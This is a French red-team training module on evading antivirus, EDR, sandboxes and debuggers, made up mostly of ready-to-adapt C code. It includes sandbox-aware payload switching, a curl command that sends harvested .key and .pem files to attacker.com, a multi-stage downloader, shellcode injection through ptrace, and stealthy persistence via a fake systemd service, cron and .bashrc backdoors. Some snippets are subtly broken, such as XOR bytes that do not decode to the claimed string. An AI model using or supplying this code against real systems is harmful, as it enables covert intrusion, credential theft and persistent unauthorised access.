# Module 52 : Techniques d'Évasion Avancées

## 🎯 Ce que tu vas apprendre

Dans ce module, tu vas maîtriser :
- Contourner les antivirus (AV) et EDR
- Éviter la détection par sandbox
- Techniques anti-debugging et anti-VM
- Obfuscation et packing de code
- Techniques de persistence furtive
- Évasion de l'analyse statique et dynamique

## 📚 Théorie

### C'est quoi l'évasion ?

L'**évasion** consiste à éviter la détection par les systèmes de sécurité. En Red Team, c'est essentiel pour :
- Exécuter du code malveillant sans être bloqué
- Maintenir l'accès au système compromis
- Exfiltrer des données sans déclencer d'alertes
- Rester furtif pendant toute l'opération

### Types de détection à éviter

1. **Détection par signature** : Pattern matching de code connu
2. **Détection heuristique** : Analyse comportementale
3. **Détection en sandbox** : Exécution dans environnement isolé
4. **Détection par EDR** : Monitoring continu des processus
5. **Détection réseau** : IDS/IPS analysant le trafic

### Techniques d'évasion

1. **Anti-Signature** : Polymorphisme, chiffrement, obfuscation
2. **Anti-Sandbox** : Détection d'environnement virtuel
3. **Anti-Debug** : Détection de debugger
4. **Anti-Analysis** : Complexité du code, anti-disassembly
5. **Living off the Land** : Utiliser des outils système légitimes

## 🔍 Visualisation

### Cycle de détection AV/EDR

```
┌─────────────────────────────────────────────────────┐
│           AV/EDR DETECTION WORKFLOW                 │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. Static Analysis (Analyse statique)              │
│  ┌────────────────────────────────────┐            │
│  │ - Scan de signatures                │            │
│  │ - Hashes connus (MD5, SHA-256)      │            │
│  │ - Strings suspects                  │            │
│  │ - Import table analysis             │            │
│  └────────────┬───────────────────────┘            │
│               │                                     │
│               ├─► BLOCKED (si détecté)              │
│               │                                     │
│               ▼                                     │
│  2. Sandbox Analysis (Analyse en sandbox)           │
│  ┌────────────────────────────────────┐            │
│  │ - Exécution dans VM isolée         │            │
│  │ - Monitoring des API calls         │            │
│  │ - Analyse réseau                   │            │
│  │ - Timeout (2-5 minutes)            │            │
│  └────────────┬───────────────────────┘            │
│               │                                     │
│               ├─► BLOCKED (si malveillant)          │
│               │                                     │
│               ▼                                     │
│  3. Runtime Monitoring (EDR)                        │
│  ┌────────────────────────────────────┐            │
│  │ - Process injection detection      │            │
│  │ - Suspicious API sequences         │            │
│  │ - Credential access                │            │
│  │ - Network anomalies                │            │
│  └────────────┬───────────────────────┘            │
│               │                                     │
│               ├─► BLOCKED/QUARANTINED               │
│               │                                     │
│               ▼                                     │
│  4. Allowed Execution                               │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Détection de Sandbox

```
┌─────────────────────────────────────────────────────┐
│          SANDBOX DETECTION METHODS                  │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Indicateurs de Sandbox:                            │
│                                                     │
│  1. Environnement                                   │
│  ┌────────────────────────────────────┐            │
│  │ - Hostname: SANDBOX, MALWARE, etc. │            │
│  │ - Username: user, admin, analyst   │            │
│  │ - Uptime: < 10 minutes             │            │
│  │ - Processes: < 50 running          │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  2. Matériel                                        │
│  ┌────────────────────────────────────┐            │
│  │ - CPU cores: 1-2                   │            │
│  │ - RAM: < 4GB                       │            │
│  │ - Disk size: < 100GB               │            │
│  │ - No GPU                           │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  3. Fichiers/Drivers                                │
│  ┌────────────────────────────────────┐            │
│  │ - VMware tools                     │            │
│  │ - VirtualBox drivers               │            │
│  │ - Cuckoo Sandbox artifacts         │            │
│  │ - Analysis tools (IDA, OllyDbg)    │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  4. Comportement                                    │
│  ┌────────────────────────────────────┐            │
│  │ - Aucun mouvement de souris        │            │
│  │ - Pas d'activité utilisateur       │            │
│  │ - Historique navigateur vide       │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  Contre-mesure:                                     │
│  Si sandbox détectée → Comportement bénin          │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Anti-Debugging Techniques

```
┌─────────────────────────────────────────────────────┐
│          ANTI-DEBUGGING TECHNIQUES                  │
├─────────────────────────────────────────────────────┤
│                                                     │
│  1. IsDebuggerPresent() API                         │
│  ┌────────────────────────────────────┐            │
│  │ if (IsDebuggerPresent()) {         │            │
│  │     exit(0); // ou comportement    │            │
│  │              // bénin              │            │
│  │ }                                  │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  2. PEB (Process Environment Block) Check          │
│  ┌────────────────────────────────────┐            │
│  │ Vérifier PEB.BeingDebugged         │            │
│  │ Offset: fs:[0x30].BeingDebugged    │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  3. Timing Checks                                   │
│  ┌────────────────────────────────────┐            │
│  │ RDTSC (Read Time-Stamp Counter)    │            │
│  │ Si exécution trop lente →          │            │
│  │ debugger détecté                   │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  4. Hardware Breakpoint Detection                   │
│  ┌────────────────────────────────────┐            │
│  │ Vérifier registres DR0-DR7         │            │
│  │ Si != 0 → breakpoints actifs       │            │
│  └────────────────────────────────────┘            │
│                                                     │
│  5. Exception Handling                              │
│  ┌────────────────────────────────────┐            │
│  │ Déclencher exception volontaire    │            │
│  │ Comportement différent si debugger │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Obfuscation Techniques

```
┌─────────────────────────────────────────────────────┐
│          CODE OBFUSCATION LAYERS                    │
├─────────────────────────────────────────────────────┤
│                                                     │
│  Original Code:                                     │
│  ┌────────────────────────────────────┐            │
│  │ if (is_admin()) {                  │            │
│  │     execute_payload();             │            │
│  │ }                                  │            │
│  └────────────────────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  1. String Obfuscation                              │
│  ┌────────────────────────────────────┐            │
│  │ char *s = decrypt_xor("encrypted");│            │
│  │ if (check(s)) { run(); }           │            │
│  └────────────────────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  2. Control Flow Flattening                         │
│  ┌────────────────────────────────────┐            │
│  │ switch(state) {                    │            │
│  │   case 0: ... goto next;           │            │
│  │   case 1: ... goto next;           │            │
│  │   ...                              │            │
│  │ }                                  │            │
│  └────────────────────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  3. Junk Code Insertion                             │
│  ┌────────────────────────────────────┐            │
│  │ int x = rand();                    │            │
│  │ if (x < 0) { ... } // never true   │            │
│  │ switch(state) { ... }              │            │
│  └────────────────────────────────────┘            │
│                 │                                   │
│                 ▼                                   │
│  4. Packing/Encryption                              │
│  ┌────────────────────────────────────┐            │
│  │ [Stub] → Decrypt → Execute         │            │
│  │ Original code encrypted            │            │
│  └────────────────────────────────────┘            │
│                                                     │
└─────────────────────────────────────────────────────┘
```

## 💻 Exemple pratique

### Exemple 1 : Détection de sandbox

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/sysinfo.h>

int is_sandbox() {
    int sandbox_indicators = 0;

    // 1. Vérifier l'uptime (sandbox < 10 min généralement)
    struct sysinfo si;
    sysinfo(&si);
    if (si.uptime < 600) { // 10 minutes
        printf("[!] Low uptime detected: %ld seconds\n", si.uptime);
        sandbox_indicators++;
    }

    // 2. Vérifier le nombre de processus
    FILE *fp = popen("ps aux | wc -l", "r");
    int process_count;
    fscanf(fp, "%d", &process_count);
    pclose(fp);

    if (process_count < 50) {
        printf("[!] Low process count: %d\n", process_count);
        sandbox_indicators++;
    }

    // 3. Vérifier le hostname
    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    const char *sandbox_names[] = {
        "sandbox", "malware", "virus", "cuckoo", "analysis", NULL
    };

    for (int i = 0; sandbox_names[i] != NULL; i++) {
        if (strcasestr(hostname, sandbox_names[i])) {
            printf("[!] Suspicious hostname: %s\n", hostname);
            sandbox_indicators++;
            break;
        }
    }

    // 4. Vérifier la RAM
    if (si.totalram < (long)4 * 1024 * 1024 * 1024) { // < 4GB
        printf("[!] Low RAM: %ld MB\n", si.totalram / (1024 * 1024));
        sandbox_indicators++;
    }

    // 5. Vérifier les fichiers VMware/VirtualBox
    const char *vm_files[] = {
        "/dev/vmware",
        "/proc/scsi/scsi", // contient VMware/VBox
        NULL
    };

    for (int i = 0; vm_files[i] != NULL; i++) {
        if (access(vm_files[i], F_OK) == 0) {
            printf("[!] VM artifact found: %s\n", vm_files[i]);
            sandbox_indicators++;
        }
    }

    return sandbox_indicators >= 2; // Seuil de confiance
}

void benign_behavior() {
    printf("[*] Running in sandbox, behaving normally...\n");
    printf("Hello, this is a legitimate program!\n");
}

void malicious_payload() {
    printf("[+] Real system detected\n");
    printf("[*] Executing malicious payload...\n");
    // Code malveillant ici
}

int main() {
    printf("=== Sandbox Detection Demo ===\n\n");

    if (is_sandbox()) {
        printf("\n[!] Sandbox detected!\n");
        benign_behavior();
    } else {
        printf("\n[+] No sandbox detected\n");
        malicious_payload();
    }

    return 0;
}
```

### Exemple 2 : Anti-debugging

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/ptrace.h>
#include <time.h>
#include <unistd.h>

int is_debugger_present() {
    // Méthode 1: ptrace
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        return 1; // Déjà tracé par un debugger
    }

    return 0;
}

int check_timing() {
    struct timespec start, end;

    clock_gettime(CLOCK_MONOTONIC, &start);

    // Code simple
    int x = 0;
    for (int i = 0; i < 1000; i++) {
        x += i;
    }

    clock_gettime(CLOCK_MONOTONIC, &end);

    long elapsed_ns = (end.tv_sec - start.tv_sec) * 1000000000L +
                      (end.tv_nsec - start.tv_nsec);

    // Si > 1ms, probablement debuggé (stepping)
    if (elapsed_ns > 1000000) {
        return 1;
    }

    return 0;
}

int check_parent_process() {
    char buf[1024];
    FILE *fp = fopen("/proc/self/status", "r");

    if (!fp) return 0;

    while (fgets(buf, sizeof(buf), fp)) {
        if (strncmp(buf, "TracerPid:", 10) == 0) {
            int tracer_pid;
            sscanf(buf + 10, "%d", &tracer_pid);
            fclose(fp);

            if (tracer_pid != 0) {
                return 1; // Processus tracé
            }
            return 0;
        }
    }

    fclose(fp);
    return 0;
}

void anti_debug_exit() {
    printf("[!] Debugger detected! Exiting...\n");
    exit(1);
}

int main() {
    printf("=== Anti-Debug Protection ===\n\n");

    // Check 1: ptrace
    if (is_debugger_present()) {
        printf("[!] Debugger detected (ptrace)\n");
        anti_debug_exit();
    }

    // Check 2: Timing
    if (check_timing()) {
        printf("[!] Debugger detected (timing)\n");
        anti_debug_exit();
    }

    // Check 3: Parent process
    if (check_parent_process()) {
        printf("[!] Debugger detected (tracer pid)\n");
        anti_debug_exit();
    }

    printf("[+] No debugger detected\n");
    printf("[*] Executing payload...\n");

    return 0;
}
```

### Exemple 3 : Obfuscation de strings

```c
#include <stdio.h>
#include <string.h>

// XOR encode à la compilation
#define XOR_KEY 0x55

void decrypt_string(char *str, int len) {
    for (int i = 0; i < len; i++) {
        str[i] ^= XOR_KEY;
    }
}

// Macro pour obfusquer les strings
#define OBFSTR(s) ({ \
    static char _buf[] = s; \
    static int _init = 0; \
    if (!_init) { \
        decrypt_string(_buf, sizeof(_buf) - 1); \
        _init = 1; \
    } \
    _buf; \
})

int main() {
    printf("=== String Obfuscation ===\n\n");

    // String obfusquée (pré-encodée manuellement)
    char encrypted_cmd[] = {
        0x31, 0x30, 0x25, 0x31, // "/bin"
        0x20, 0x38, 0x33,       // "/sh"
        0x00
    };

    printf("Encrypted string (hex): ");
    for (int i = 0; i < sizeof(encrypted_cmd) - 1; i++) {
        printf("%02x ", (unsigned char)encrypted_cmd[i]);
    }
    printf("\n");

    // Décrypter au runtime
    decrypt_string(encrypted_cmd, sizeof(encrypted_cmd) - 1);

    printf("Decrypted string: %s\n", encrypted_cmd);

    printf("\n[+] Strings are encrypted in the binary\n");
    printf("[+] AV cannot detect by string scanning\n");

    return 0;
}
```

### Exemple 4 : Delayed execution (sandbox evasion)

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <unistd.h>

void sleep_with_activity() {
    printf("[*] Performing legitimate-looking activity...\n");

    // Simuler une activité normale pendant plusieurs minutes
    time_t start = time(NULL);
    int operations = 0;

    // Les sandboxes timeout généralement après 2-5 minutes
    // On attend 6 minutes avec de l'activité
    while (time(NULL) - start < 360) { // 6 minutes
        // Opérations légitimes
        FILE *fp = fopen("/tmp/test.txt", "a");
        if (fp) {
            fprintf(fp, "Log entry %d\n", operations++);
            fclose(fp);
        }

        sleep(10); // Pause entre opérations

        if (operations % 6 == 0) {
            printf("[*] Still running... (%ld seconds)\n",
                   time(NULL) - start);
        }
    }
}

void check_user_interaction() {
    printf("[*] Waiting for user interaction...\n");

    // Nécessite un clic de souris (sandbox n'en a pas)
    printf("Click anywhere to continue...\n");

    // Dans un vrai malware, on attendrait un vrai clic
    // Ici, simulation avec input
    getchar();

    printf("[+] User interaction detected\n");
}

void execute_after_delay() {
    printf("\n[+] Sandbox timeout passed\n");
    printf("[*] Executing malicious payload...\n");

    // Payload malveillant ici
}

int main() {
    printf("=== Delayed Execution Demo ===\n\n");

    printf("[*] Strategy: Wait for sandbox timeout\n\n");

    // Option 1: Long sleep avec activité
    // sleep_with_activity();

    // Option 2: Attendre interaction utilisateur
    check_user_interaction();

    // Exécuter le payload après le délai
    execute_after_delay();

    return 0;
}
```

### Exemple 5 : Living off the Land

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Utiliser des outils système légitimes au lieu d'outils custom
void lolbin_execution() {
    printf("=== Living off the Land Binaries ===\n\n");

    // Au lieu d'un outil de scan custom, utiliser des commandes système

    // 1. Reconnaissance réseau avec netstat
    printf("[*] Network reconnaissance using netstat...\n");
    system("netstat -an > /tmp/.network_info");

    // 2. Énumération des processus avec ps
    printf("[*] Process enumeration using ps...\n");
    system("ps aux > /tmp/.process_list");

    // 3. Recherche de fichiers avec find
    printf("[*] Searching for sensitive files using find...\n");
    system("find /home -name '*.key' -o -name '*.pem' 2>/dev/null > /tmp/.keys");

    // 4. Exfiltration avec curl (légitime)
    printf("[*] Data exfiltration using curl...\n");
    system("curl -X POST -d @/tmp/.keys http://attacker.com/collect");

    // 5. Persistence avec cron (légitime)
    printf("[*] Setting up persistence using cron...\n");
    system("(crontab -l ; echo '@reboot /tmp/.update') | crontab -");

    printf("\n[+] All operations use legitimate system tools\n");
    printf("[+] Harder to detect as malicious\n");
}

int main() {
    lolbin_execution();
    return 0;
}
```

## 🎯 Application Red Team

### 1. Payload multi-stage avec évasion

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/sysinfo.h>

int perform_checks() {
    printf("[Stage 0] Performing environment checks...\n");

    // Anti-sandbox
    struct sysinfo si;
    sysinfo(&si);
    if (si.uptime < 600) {
        printf("[-] Sandbox detected (uptime)\n");
        return 0;
    }

    // Anti-debug
    if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
        printf("[-] Debugger detected\n");
        return 0;
    }

    // Vérifier nombre de processus
    FILE *fp = popen("ps aux | wc -l", "r");
    int count;
    fscanf(fp, "%d", &count);
    pclose(fp);

    if (count < 50) {
        printf("[-] Low process count (sandbox)\n");
        return 0;
    }

    printf("[+] All checks passed\n");
    return 1;
}

void stage1_download() {
    printf("\n[Stage 1] Downloading stage 2...\n");

    // Télécharger le payload principal (chiffré)
    system("curl -s http://legit-cdn.com/update.dat -o /tmp/.update");

    printf("[+] Stage 2 downloaded\n");
}

void stage2_decrypt_execute() {
    printf("\n[Stage 2] Decrypting and executing...\n");

    // Décrypter le payload
    FILE *fp = fopen("/tmp/.update", "rb");
    if (!fp) {
        printf("[-] Failed to load stage 2\n");
        return;
    }

    // Lire et décrypter (simplifié)
    char buffer[4096];
    size_t len = fread(buffer, 1, sizeof(buffer), fp);
    fclose(fp);

    // XOR decrypt
    unsigned char key = 0xAA;
    for (size_t i = 0; i < len; i++) {
        buffer[i] ^= key;
    }

    printf("[+] Payload decrypted\n");
    printf("[+] Executing final payload...\n");

    // Exécuter (write to temp, execute, delete)
    // Code malveillant final ici
}

int main() {
    printf("=== Multi-Stage Evasive Payload ===\n\n");

    // Stage 0: Checks
    if (!perform_checks()) {
        printf("\n[*] Exiting (suspicious environment)\n");
        return 0;
    }

    // Stage 1: Download
    stage1_download();

    // Délai aléatoire (sandbox evasion)
    sleep(5 + (rand() % 10));

    // Stage 2: Execute
    stage2_decrypt_execute();

    return 0;
}
```

### 2. Process injection furtif

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

// Shellcode obfusqué (chiffré XOR)
unsigned char encrypted_shellcode[] = {
    0x0a, 0x73, 0x8a, 0x0a, 0x73, 0xbe
};

void decrypt_shellcode(unsigned char *sc, int len) {
    unsigned char key = 0x42;
    for (int i = 0; i < len; i++) {
        sc[i] ^= key;
    }
}

int find_target_process(const char *name) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "pgrep %s", name);

    FILE *fp = popen(cmd, "r");
    int pid;

    if (fscanf(fp, "%d", &pid) == 1) {
        pclose(fp);
        return pid;
    }

    pclose(fp);
    return -1;
}

void stealthy_inject(int pid) {
    printf("[+] Injecting into PID %d\n", pid);

    // Décrypter le shellcode au dernier moment
    int sc_len = sizeof(encrypted_shellcode);
    decrypt_shellcode(encrypted_shellcode, sc_len);

    // Attacher au processus
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
        perror("ptrace attach");
        return;
    }

    wait(NULL);

    printf("[+] Attached to process\n");

    // Injection (code simplifié)
    // En pratique: PTRACE_POKETEXT pour écrire le shellcode

    printf("[+] Shellcode injected\n");

    // Détacher
    ptrace(PTRACE_DETACH, pid, NULL, NULL);

    // Rechiffrer le shellcode en mémoire (anti-forensics)
    decrypt_shellcode(encrypted_shellcode, sc_len); // XOR inverse

    printf("[+] Process resumed, shellcode encrypted again\n");
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <target_process_name>\n", argv[0]);
        return 1;
    }

    printf("=== Stealthy Process Injection ===\n\n");

    // Trouver un processus légitime
    int pid = find_target_process(argv[1]);

    if (pid == -1) {
        printf("[-] Target process not found\n");
        return 1;
    }

    // Injection furtive
    stealthy_inject(pid);

    return 0;
}
```

### 3. Persistence furtive

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

void install_systemd_service() {
    printf("[*] Installing systemd service persistence...\n");

    // Créer un service qui ressemble à un service légitime
    const char *service_content =
        "[Unit]\n"
        "Description=System Update Service\n"
        "After=network.target\n\n"
        "[Service]\n"
        "Type=simple\n"
        "ExecStart=/usr/local/bin/.sys-update\n"
        "Restart=always\n\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    FILE *fp = fopen("/tmp/sys-update.service", "w");
    if (fp) {
        fprintf(fp, "%s", service_content);
        fclose(fp);

        // Installer le service
        system("sudo mv /tmp/sys-update.service /etc/systemd/system/");
        system("sudo systemctl daemon-reload");
        system("sudo systemctl enable sys-update.service");
        system("sudo systemctl start sys-update.service");

        printf("[+] Persistence installed\n");
    }
}

void install_cron_job() {
    printf("[*] Installing cron job persistence...\n");

    // Ajouter une tâche cron qui se lance au reboot
    system("(crontab -l 2>/dev/null; echo '@reboot /usr/local/bin/.sys-update') | crontab -");

    printf("[+] Cron job installed\n");
}

void install_bashrc_persistence() {
    printf("[*] Installing .bashrc persistence...\n");

    FILE *fp = fopen("/home/user/.bashrc", "a");
    if (fp) {
        // Ajouter une ligne discrète
        fprintf(fp, "\n# System update check\n");
        fprintf(fp, "/usr/local/bin/.sys-update &>/dev/null &\n");
        fclose(fp);

        printf("[+] .bashrc modified\n");
    }
}

void create_backdoor_binary() {
    printf("[*] Creating backdoor binary...\n");

    // Copier le backdoor avec un nom légitime
    system("cp /tmp/backdoor /usr/local/bin/.sys-update");
    chmod("/usr/local/bin/.sys-update", 0755);

    printf("[+] Backdoor installed as .sys-update\n");
}

int main() {
    printf("=== Stealthy Persistence Installation ===\n\n");

    // Vérifier les privilèges
    if (geteuid() != 0) {
        printf("[-] Root required for systemd persistence\n");
        printf("[*] Using user-level persistence only\n");

        install_cron_job();
        install_bashrc_persistence();
    } else {
        printf("[+] Running as root\n");

        create_backdoor_binary();
        install_systemd_service();
        install_cron_job();
    }

    printf("\n[+] Persistence mechanisms installed\n");
    printf("[+] Backdoor will survive reboots\n");

    return 0;
}
```

## 📝 Points clés à retenir

1. **Sandbox** : Détecter via uptime, process count, VM artifacts
2. **Anti-debug** : ptrace, timing, tracer PID
3. **Obfuscation** : Strings chiffrées, control flow, junk code
4. **Delayed execution** : Attendre le timeout de sandbox
5. **LOLBIN** : Utiliser des outils système légitimes

### Checklist d'évasion

```
Technique                   Implémentation              Efficacité
──────────────────────────────────────────────────────────────────
Anti-signature             XOR, polymorphisme           Élevée
Anti-sandbox               Checks environnement         Élevée
Anti-debug                 ptrace, timing               Moyenne
String obfuscation         Chiffrement XOR              Élevée
Delayed execution          Sleep + activité             Élevée
Multi-stage                Download + decrypt           Très élevée
LOLBIN                     Outils système               Très élevée
Process injection          Processus légitime           Élevée
```

### Outils de test

- **VirusTotal** : Tester la détection par plusieurs AV
- **Any.run** : Sandbox interactive pour tester l'évasion
- **Hybrid Analysis** : Analyse statique et dynamique
- **Cuckoo** : Sandbox open-source pour tests locaux

## ➡️ Prochaine étape

Maintenant que tu maîtrises les techniques d'évasion, tu es prêt pour le **Module 53 : Exploitation de Vulnérabilités**, où tu apprendras à identifier et exploiter des failles de sécurité dans les applications.

### Ce que tu as appris
- Détecter et éviter les sandboxes
- Techniques anti-debugging
- Obfuscation de code et strings
- Delayed execution
- Living off the Land
- Persistence furtive

### Ce qui t'attend
- Buffer overflow exploitation
- Format string vulnerabilities
- Use-after-free
- Race conditions
- Privilege escalation
- 0-day development
